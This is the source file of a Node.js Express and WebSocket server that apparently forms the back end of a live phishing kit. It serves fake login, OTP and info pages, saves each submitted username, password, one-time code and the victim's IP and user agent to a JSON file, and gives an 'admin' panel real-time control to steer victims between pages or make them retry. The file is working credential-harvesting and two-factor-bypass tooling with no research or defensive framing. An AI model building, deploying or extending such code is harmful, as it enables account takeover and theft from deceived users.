const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const adminConnections = new Set();  // To store connected admin WebSockets

const userConnections = {}; // Map IP addresses to their WebSockets

app.get('/admin', (req, res) => {
    res.sendFile(__dirname + '/public/admin.html');
});

app.get('/info', (req, res) => {
    res.sendFile(__dirname + '/public/info.html');
});

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/public/login.html');
});

app.get('/otp', (req, res) => {
    res.sendFile(__dirname + '/public/otp.html');
});

wss.on('connection', (ws, req) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    userConnections[ip] = ws

    console.log(`${ip} connected`);
    for (const adminWs of adminConnections) {
        adminWs.send(JSON.stringify({
            type: 'user_activity',
            activity: 'actif',
            url: 'login',
            ip: ip
        }));
    }


    ws.on('message', (message) => {
        const data = JSON.parse(message);

        if (data.type === 'admin_connect') {
            adminConnections.add(ws);
            console.log('Admin connected');
            return;
        }

        if (data.type === 'login') {
            const user = {
                username: data.username,
                password: data.password,
                ip: ip,
                userAgent: userAgent
            };

            // Save user data to JSON file
            fs.appendFileSync('users.json', JSON.stringify(user) + '\n');

            console.log(`Saved login data from ${ip}`);

            ws.send(JSON.stringify({
                type: 'navigate',
                url: '/info'
            }));
        } else if (data.type === 'otp') {
            const otp = { otp: data.otp }

            // Save user data to JSON file
            fs.appendFileSync('users.json', JSON.stringify(otp) + '\n');

            console.log(`Saved login data from ${ip}`);

            ws.send(JSON.stringify({
                type: 'navigate',
                url: '/login'
            }));

        } else if (data.type === 'info') {
            const info = { otp: data.info, ip: ip }

            // Save user data to JSON file
            fs.appendFileSync('users.json', JSON.stringify(info) + '\n');

            console.log(`Saved login data from ${ip}`);

            ws.send(JSON.stringify({
                type: 'navigate',
                url: '/login'
            }));

        }  else if (data.type == 'navigate_user') {
            const userWs = userConnections[data.ip];
            console.log(`${ip} is going to otp page`);
            for (const adminWs of adminConnections) {
                adminWs.send(JSON.stringify({
                    type: 'user_activity',
                    activity: 'actif',
                    ip: ip,
                    url: data.url
                }));
            }
            if (userWs) {
                userWs.send(JSON.stringify({
                    type: 'navigate',
                    url: data.url,
                    activity: 'actif',
                    ip: ip
                }));
            }

        } else if (data.type == 'warn_and_retry') {
            const userWs = userConnections[data.ip];
            console.log(`${ip} is going to otp page`);
            if (userWs) {
                userWs.send(JSON.stringify({
                    type: 'warn_and_retry',
                    url: data.url
                }));
            }
        }
        else {
            console.log(`${ip} typing`);
        }

    });


    ws.on('close', (code, reason) => {
        console.log(`${ip} disconnected with code: ${code} and reason: ${reason}`);
        for (const adminWs of adminConnections) {
            adminWs.send(JSON.stringify({
                type: 'user_activity',
                activity: 'inactif',
                ip: ip
            }));
        }
    });

});


app.use(express.static('public'));


server.listen(80, () => {
    console.log('Server is running on http://localhost:80');
});
